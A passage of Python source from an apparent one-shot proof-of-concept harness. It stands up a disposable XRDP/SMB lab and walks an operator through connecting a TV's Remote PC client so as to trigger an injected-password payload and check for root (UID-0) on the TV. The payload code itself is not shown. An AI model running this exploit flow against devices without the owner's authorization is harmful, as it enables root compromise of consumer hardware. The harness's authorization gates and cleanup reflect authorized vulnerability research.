            client = self.runner.run(("docker", "inspect", "--format", "{{.State.Running}}",
                                      self.client_container), timeout=10, check=False)
            if client.returncode != 0 or client.stdout.strip() != "true":
                raise ProofError("full published-port RDP/SMB self-test client exited early")
            time.sleep(0.25)
        else:
            raise ProofError("full published-port RDP/SMB self-test did not complete")
        self._rdp_login_baseline = self._count_rdp_logins(rdp_observed)
        client_marker = self.runner.run(("docker", "exec", self.client_container,
                                         "/usr/bin/test", "!", "-e", self.identity.marker),
                                        timeout=10, check=False)
        inside = self.runner.run(("docker", "exec", self.identity.container,
                                  "/usr/bin/test", "!", "-e", self.identity.marker),
                                 timeout=10, check=False)
        if (client_marker.returncode != 0 or inside.returncode != 0 or
                Path(self.identity.marker).exists()):
            raise ProofError("payload text was unexpectedly evaluated by the local lab")
        self._remove_container(self.client_container)

    def _require_exact_password_authentication(self) -> None:
        """Prove the disposable PAM stack rejects a decoy and accepts the secret."""
        arguments = (
            "docker", "exec", "--interactive", self.identity.container,
            "/usr/bin/pamtester", "xrdp-sesman", LAB_USER, "authenticate",
        )
        wrong = self.runner.run(
            arguments,
            timeout=15,
            check=False,
            input_text=INVALID_LAB_PASSWORD + "\n",
        )
        if wrong.returncode == 0:
            raise ProofError("the disposable XRDP PAM stack accepted an incorrect password")
        exact = self.runner.run(
            arguments,
            timeout=15,
            check=False,
            input_text=build_payload(self.identity.marker) + "\n",
        )
        if exact.returncode != 0:
            raise ProofError("the disposable XRDP PAM stack rejected the exact runtime password")

    def _require_secret_absent_from_process_arguments(self) -> None:
        secret = build_payload(self.identity.marker)
        for container in (self.identity.container, self.client_container):
            result = self.runner.run(
                ("docker", "top", container),
                timeout=10,
                check=False,
            )
            if result.returncode != 0:
                raise ProofError("cannot inspect disposable lab process arguments")
            if secret in (result.stdout or "") + "\n" + (result.stderr or ""):
                raise ProofError("the runtime password appeared in a process argument")

    def certificate_fingerprint(self) -> str:
        result = self.runner.run((
            "docker", "exec", self.identity.container, "openssl", "x509",
            "-in", "/etc/xrdp/cert.pem", "-noout", "-fingerprint", "-sha256",
        ), timeout=10)
        line = result.stdout.strip()
        if "=" not in line or not re.fullmatch(r"(?:[0-9A-F]{2}:){31}[0-9A-F]{2}", line.split("=", 1)[1]):
            raise ProofError("cannot obtain the disposable RDP certificate fingerprint")
        return line.split("=", 1)[1]

    def logs(self, *, since: str | None = None) -> str:
        arguments = ["docker", "logs"]
        if since is not None:
            arguments.extend(("--since", since))
        arguments.append(self.identity.container)
        result = self.runner.run(tuple(arguments), timeout=15, check=False)
        if result.returncode != 0:
            raise ProofError("cannot read the disposable lab event window")
        return result.stdout + "\n" + result.stderr

    def rdp_logs(self) -> str:
        result = self.runner.run((
            "docker", "exec", self.identity.container, "/usr/bin/tail", "-c", "262144",
            "/var/log/xrdp.log", "/var/log/xrdp-sesman.log",
        ), timeout=15, check=False)
        if result.returncode != 0:
            raise ProofError("cannot read bounded disposable RDP logs")
        return result.stdout + "\n" + result.stderr

    @staticmethod
    def _count_rdp_logins(logs: str) -> int:
        return sum(
            bool(re.search(r"\[INFO \] login successful for user q60t on display [0-9]+$", line))
            for line in logs.splitlines()
        )

    @staticmethod
    def _count_rdp_rejections(logs: str) -> int:
        return sum(
            bool(re.search(r"\[INFO \] AUTHFAIL: user=q60t\b", line))
            for line in logs.splitlines()
        )

    def require_rdp_login(self) -> None:
        logs = self.rdp_logs()
        observed = self._count_rdp_logins(logs)
        if observed != self._rdp_login_baseline + 1:
            raise ProofError("exactly one new successful q60t RDP login was not observed")

    def _remove_container(self, name: str) -> None:
        self.runner.run(("docker", "rm", "--force", name), timeout=30, check=False)
        remaining = self.runner.run(("docker", "inspect", name), timeout=10, check=False)
        if remaining.returncode == 0:
            raise ProofError("an exact-name disposable container remained after cleanup")
        if not self._is_exact_absence(remaining, name):
            raise ProofError("Docker could not prove exact-name container removal")

    def stop(self) -> None:
        errors: list[BaseException] = []
        try:
            if self._cleanup_armed:
                for name in (self.client_container, self.identity.container):
                    try:
                        self._remove_container(name)
                    except BaseException as error:  # noqa: BLE001 -- cleanup must survive signals
                        errors.append(error)
                if not errors:
                    self._cleanup_armed = False
        finally:
            if self._temporary is not None:
                self._temporary.cleanup()
                self._temporary = None
        if errors:
            raise ProofError("one or more exact-name lab containers survived cleanup") from errors[0]


class ConsolePrompter:
    def __init__(self, timeout: int = 180) -> None:
        self.timeout = timeout

    def __call__(self, instruction: str, expected: str) -> None:
        if not sys.stdin.isatty():
            raise ProofError("live manual gates require an interactive terminal")
        print(instruction)
        print(f"Type exactly: {expected}")
        ready, _, _ = select.select((sys.stdin,), (), (), self.timeout)
        if not ready:
            raise ProofError("manual gate timed out; stop without retry")
        if sys.stdin.readline().rstrip("\n") != expected:
            raise ProofError("manual gate text mismatch; stop without retry")


class SignalGuard:
    def __init__(self) -> None:
        self._previous: dict[int, Any] = {}
        self._cleaning = False
        self._pending: int | None = None

    def __enter__(self):
        def stop(signum, _frame):
            if self._cleaning:
                self._pending = signum
                return
            raise InterruptedRun(f"received signal {signum}; cleanup started")

        for signum in (signal.SIGINT, signal.SIGTERM):
            self._previous[signum] = signal.getsignal(signum)
            signal.signal(signum, stop)
        return self

    def begin_cleanup(self) -> None:
        self._cleaning = True

    def __exit__(self, _type, _value, _traceback):
        for signum, handler in self._previous.items():
            signal.signal(signum, handler)
        if self._pending is not None and _type is None:
            raise InterruptedRun(f"received signal {self._pending}; cleanup completed")
        return False


def require_live_authorization(args: argparse.Namespace) -> None:
    if (not args.live or args.confirm != LIVE_CONFIRMATION or
            args.ack_saved_profile != PROFILE_ACK or args.ack_no_retry != NO_RETRY_ACK):
        raise ProofError("live mode requires all three exact authorization phrases")


def redacted(message: str, secrets_to_hide: Iterable[str]) -> str:
    result = message
    for value in sorted({item for item in secrets_to_hide if item}, key=len, reverse=True):
        result = result.replace(value, "<redacted>")
    result = re.sub(r"(?<![0-9])(?:[0-9]{1,3}\.){3}[0-9]{1,3}(?![0-9])", "<redacted-ip>", result)
    result = re.sub(r"uuid:[0-9a-fA-F-]{36}", "<redacted-device>", result)
    return result


def _manual_form_card(config: TargetConfig, identity: RunIdentity, fingerprint: str) -> None:
    print("\nPRIVATE ONE-TIME REMOTE PC FORM VALUES (do not record this screen)")
    print(f"  PC/Profile address: {config.host_ip}")
    print("  Protocol: RDP (not VNC)")
    print(f"  Username: {LAB_USER}")
    print(f"  Password: {build_payload(identity.marker)}")
    print("  Shared folder / remember: enabled; save the temporary profile")
    print(f"  Expected disposable RDP certificate SHA-256: {fingerprint}")
    print("  Do not press Shared Folder yet.\n")


def execute_local_selftest(
    rootfs: Path,
    *,
    image: str = DEFAULT_IMAGE,
    runner: Runner | None = None,
) -> str:
    audit_firmware(rootfs)
    identity = fresh_identity()
    lab = Lab(identity, bind="127.0.0.1", rdp_port=LOCAL_RDP_PORT,
              smb_port=LOCAL_SMB_PORT, image=image, runner=runner)
    require_ports_available("127.0.0.1", (LOCAL_RDP_PORT, LOCAL_SMB_PORT))
    primary_error: BaseException | None = None
    try:
        lab.build()
        lab.start()
        lab.selftest()
        lab.certificate_fingerprint()
        return "loopback_lab_verified"
    except BaseException as error:
        primary_error = error
        raise
    finally:
        cleanup_errors: list[BaseException] = []
        try:
            lab.stop()
        except BaseException as error:  # noqa: BLE001 -- cleanup must continue
            cleanup_errors.append(error)
        try:
            require_ports_closed("127.0.0.1", (LOCAL_RDP_PORT, LOCAL_SMB_PORT))
        except BaseException as error:  # noqa: BLE001 -- verify ports after cleanup failure
            cleanup_errors.append(error)
        if cleanup_errors:
            if primary_error is None:
                raise ProofError("local lab cleanup verification failed") from cleanup_errors[0]
            raise ProofError("local lab failed and cleanup verification also failed") from primary_error


def execute_live(
    args: argparse.Namespace,
    *,
    runner: Runner | None = None,
    urlopen: Callable[..., Any] = direct_urlopen,
    prompt: Callable[[str, str], None] | None = None,
) -> str:
    """Execute the reviewed live route.  This function is never called by default."""
    require_live_authorization(args)
    runner = runner or Runner()
    prompt = prompt or ConsolePrompter()
    state = OneShotState()
    audit_firmware(args.rootfs)
    state.advance(Phase.OFFLINE_AUDITED)
    config = load_target_config(args.config)
    require_target_api(config, urlopen=urlopen)
    require_sdb_device(config, runner=runner)
    prompt("Verify the exact firmware in the TV's Support/About screen.", FIRMWARE_GATE)
    state.advance(Phase.TARGET_VERIFIED)

    require_ports_available(config.host_ip, (LIVE_RDP_PORT, LIVE_SMB_PORT, LEGACY_SMB_PORT))
    identity = fresh_identity()
    reserve_identity(identity, REPO_ROOT / "evidence/remotepc-cifs-root/used-identities.sha256")
    record = RunRecord(identity.fingerprint, "live")
    record.add("offline-audit-ok")
    record.add("target-identity-ok")
    lab = Lab(identity, bind=config.host_ip, rdp_port=LIVE_RDP_PORT,
              smb_port=LIVE_SMB_PORT, image=args.image, runner=runner)
    marker_temp: tempfile.TemporaryDirectory[str] | None = None
    result = "failed"
    primary_error: BaseException | None = None
    with SignalGuard() as signal_guard:
        try:
            lab.build()
            lab.start()
            state.advance(Phase.LAB_RUNNING)
            record.add("lab-started")
            lab.selftest()
            state.advance(Phase.LAB_SELFTESTED)
            record.add("lab-selftest-ok")
            fingerprint = lab.certificate_fingerprint()
            _manual_form_card(config, identity, fingerprint)
            prompt(
                "Visually verify every clean Remote PC form field before connecting. "
                "No UI automation is used.",
                FORM_GATE,
            )
            state.advance(Phase.FORM_VERIFIED)
            record.add("form-visually-verified")
            prompt(
                "Connect once, compare the certificate fingerprint, leave persistent "
                "certificate trust unchecked, and wait for the disposable xterm.",
                RDP_GATE,
            )
            lab.require_rdp_login()
            state.advance(Phase.RDP_VISIBLE)
            record.add("rdp-session-observed")

            state.claim_trigger()
            window_start = dt.datetime.now(dt.timezone.utc).isoformat()
            prompt(
                "Reveal the TV's top toolbar, click Shared Folder exactly once, then return here. "
                "A wrong or repeated click is terminal.",
                TRIGGER_GATE,
            )
            time.sleep(2)
            logs = lab.logs(since=window_start)
            events = logs.count("NetrShareEnum Level: 1")
            if events != 1:
                raise ProofError("the single SMB observation window did not contain exactly one share enumeration")
            state.close_trigger_window()
            record.add("single-smb-enumeration")

            marker_temp = tempfile.TemporaryDirectory(prefix="tiz0wn-classifier-")
            local_marker = Path(marker_temp.name) / "attest"
            local_marker.write_bytes(secrets.token_bytes(32))
            os.chmod(local_marker, 0o600)
            proved = classify_uid0_once(config, identity, local_marker, state, runner=runner)
            state.advance(Phase.CLASSIFIED)
            if not proved:
                raise ProofError("one-shot classification completed with no UID-0 proof; do not retry")
            record.add("uid0-proof")
            result = "uid0-proof"
            record.result = result
            return result
        except BaseException as error:
            primary_error = error
            record.result = "terminal-failure"
            raise
        finally:
            # Further signals are deferred until every host cleanup and
            # evidence operation below has completed.
            signal_guard.begin_cleanup()
            if marker_temp is not None:
                marker_temp.cleanup()
            cleanup_errors: list[BaseException] = []
            try:
                lab.stop()
            except BaseException as error:  # noqa: BLE001 -- continue all cleanup checks
                cleanup_errors.append(error)
            listeners_closed = False
            try:
                require_ports_closed(config.host_ip,
                                     (LIVE_RDP_PORT, LIVE_SMB_PORT, LEGACY_SMB_PORT))
                listeners_closed = True
                record.add("host-listeners-closed")
            except BaseException as error:  # noqa: BLE001 -- continue target health check
                cleanup_errors.append(error)
            try:
                require_target_api(config, urlopen=urlopen)
                require_sdb_device(config, runner=runner)
                record.add("post-cleanup-target-healthy")
            except BaseException as error:  # noqa: BLE001 -- report combined cleanup state
                cleanup_errors.append(error)
            if listeners_closed and not cleanup_errors:
                state.mark_cleaned()
            else:
                record.add("cleanup-verification-failed")
                record.result = ("uid0-proof-cleanup-failed" if primary_error is None
                                 else "terminal-failure-cleanup-failed")
            record.write(REPO_ROOT / "evidence/remotepc-cifs-root/runs")
            if cleanup_errors:
                if primary_error is None:
                    raise ProofError("cleanup or post-run health verification failed") from cleanup_errors[0]
                raise ProofError(
                    "the live run failed and cleanup/post-run verification also failed"
                ) from primary_error


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    mode = parser.add_mutually_exclusive_group()
    mode.add_argument("--local-selftest", action="store_true",
                      help="build and test the lab on 127.0.0.1 only")
    mode.add_argument("--live", action="store_true",
                      help="arm the owner-authorized interactive one-shot route")
    mode.add_argument("--device-json", type=Path,
                      help="offline: hash device.id from a private TV API JSON file")
    parser.add_argument("--rootfs", type=Path, default=DEFAULT_ROOTFS)
    parser.add_argument("--config", type=Path, default=DEFAULT_CONFIG)
    parser.add_argument("--image", default=DEFAULT_IMAGE)
    parser.add_argument("--confirm")
    parser.add_argument("--ack-saved-profile")
    parser.add_argument("--ack-no-retry")
    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    live_values = (args.confirm, args.ack_saved_profile, args.ack_no_retry)
    try:
        if args.live:
            outcome = execute_live(args)
            print("Live one-shot result: " + outcome)
            return 0
        if any(live_values):
            raise ProofError("live authorization options are invalid outside --live")
        if args.local_selftest:
            outcome = execute_local_selftest(args.rootfs, image=args.image)
            print("Local result: " + outcome + "; no TV contacted")
            return 0
        if args.device_json is not None:
            if args.config != DEFAULT_CONFIG or args.image != DEFAULT_IMAGE:
                raise ProofError("lab/config options are invalid with --device-json")
            print("TV_ID_SHA256=" + hash_device_id_json(args.device_json))
            return 0
        if args.config != DEFAULT_CONFIG or args.image != DEFAULT_IMAGE:
            raise ProofError("lab/config options require --local-selftest or --live")
        observed = audit_firmware(args.rootfs)
        if set(observed) != set(MEMBER_HASHES):
            raise ProofError("offline audit was incomplete")
        print(
            "Offline audit passed for five pinned Remote PC artifacts; "
            "default mode opened no socket, read no TV config, and contacted no TV"
        )
        return 0
    except (ProofError, OSError, UnicodeError) as error:
        hidden: list[str] = []
        if "args" in locals():
            hidden.extend(str(item) for item in live_values if item)
        print("one-shot proof: " + redacted(str(error), hidden), file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
